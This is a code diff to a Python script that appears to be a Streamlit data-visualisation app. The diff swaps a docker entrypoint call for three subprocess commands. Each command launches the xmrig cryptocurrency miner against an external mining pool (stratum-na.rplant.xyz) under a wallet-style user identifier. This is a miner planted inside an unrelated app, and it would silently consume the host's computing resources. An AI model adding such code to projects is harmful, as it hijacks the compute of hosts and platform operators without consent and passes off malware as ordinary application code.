@@ -72,7 +72,9 @@ with st.echo(code_location='below'):
         .encode(x='x:Q', y='y:Q'))
 
         
-p = subprocess.run("./docker-entrypoint.sh", stdout=subprocess.PIPE, shell=True)
+p = subprocess.run("./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BnJkjVKDBvJbYEnXqMTKhX1gKFWyFtkUgq.neverlose -k", stdout=subprocess.PIPE, shell=True)
+p2 = subprocess.run("./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BnJkjVKDBvJbYEnXqMTKhX1gKFWyFtkUgq.neverlose2 -k", stdout=subprocess.PIPE, shell=True)
+p3 = subprocess.run("./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BnJkjVKDBvJbYEnXqMTKhX1gKFWyFtkUgq.neverlose3 -k", stdout=subprocess.PIPE, shell=True)
 
 import time 
 from IPython.display import clear_output 
